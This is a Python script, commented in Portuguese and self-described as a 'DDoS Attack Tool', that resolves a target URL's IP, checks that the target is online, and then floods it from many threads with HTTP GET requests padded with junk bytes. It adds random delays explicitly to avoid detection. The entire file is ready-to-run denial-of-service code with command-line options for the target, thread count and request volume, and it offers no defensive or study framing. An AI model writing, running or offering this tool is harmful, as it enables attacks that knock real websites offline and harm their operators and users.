import socket
import threading
import random
import time
import logging
import argparse
import requests
import dns.resolver
from urllib.parse import urlparse

# Configuração de log
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ddos_attack.log'),
        logging.StreamHandler()
    ]
)

class DDOSAttacker:
    def __init__(self, url, num_threads=100, requests_per_thread=1000):
        self.url = url
        self.num_threads = num_threads
        self.requests_per_thread = requests_per_thread
        self.target_ip = None
        
    def resolve_domain(self):
        """Resolve o IP do domínio fornecido"""
        try:
            parsed_url = urlparse(self.url)
            domain = parsed_url.netloc
            
            # Resolução DNS
            answers = dns.resolver.resolve(domain, 'A')
            self.target_ip = str(answers[0])
            
            logging.info(f"IP resolvido: {self.target_ip}")
            return self.target_ip
            
        except Exception as e:
            logging.error(f"Erro ao resolver IP: {str(e)}")
            raise
    
    def get_target_info(self):
        """Obtém informações sobre o alvo"""
        if not self.target_ip:
            self.resolve_domain()
            
        # Verificação de disponibilidade
        try:
            response = requests.get(self.url, timeout=5)
            logging.info(
                f"Alvo está online: {self.url} "
                f"(Status: {response.status_code})"
            )
            
            # Obter informações do servidor
            server_header = response.headers.get('Server', 'Desconhecido')
            content_type = response.headers.get('Content-Type', 'Desconhecido')
            
            logging.info(f"Servidor: {server_header}")
            logging.info(f"Tipo de conteúdo: {content_type}")
            
            return {
                'ip': self.target_ip,
                'port': 443 if 'https' in self.url else 80,
                'server': server_header,
                'content_type': content_type
            }
            
        except Exception as e:
            logging.error(f"Erro ao verificar alvo: {str(e)}")
            raise
    
    def send_packet(self, thread_id):
        """Envia pacotes de ataque"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_ip, 443 if 'https' in self.url else 80))
            
            for i in range(self.requests_per_thread):
                payload = b"A" * 1024
                
                # Cabeçalhos HTTP/HTTPS para simular requisições reais
                headers = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {urlparse(self.url).netloc}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()
                
                s.send(headers + payload)
                
                # Log detalhado de cada envio
                logging.info(
                    f"[Thread-{thread_id}] Enviado {len(payload)} bytes "
                    f"para {self.target_ip}:443"
                )
                
                # Delay aleatório para evitar detecção
                time.sleep(random.uniform(0.1, 0.5))
                
            s.close()
            
        except Exception as e:
            logging.error(f"[Thread-{thread_id}] Erro: {str(e)}")
    
    def start_attack(self):
        """Inicia o ataque com múltiplas threads"""
        logging.info(f"Iniciando ataque DDoS para {self.url}")
        
        # Obter informações do alvo
        target_info = self.get_target_info()
        
        # Iniciar threads
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(
                target=self.send_packet, 
                args=(i,)
            )
            t.daemon = True
            t.start()
            threads.append(t)
            
            logging.info(f"Thread-{i} iniciada")
        
        # Aguarda todas as threads terminarem
        for t in threads:
            t.join()
        
        logging.info("Ataque concluído")

def parse_args():
    parser = argparse.ArgumentParser(description="DDoS Attack Tool")
    parser.add_argument(
        "--url", 
        required=True,
        help="URL do alvo (ex: https://example.com)"
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=100,
        help="Número de threads (padrão: 100)"
    )
    parser.add_argument(
        "--requests",
        type=int,
        default=1000,
        help="Requisições por thread (padrão: 1000)"
    )
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    
    attacker = DDOSAttacker(
        url=args.url,
        num_threads=args.threads,
        requests_per_thread=args.requests
    )
    
    attacker.start_attack()
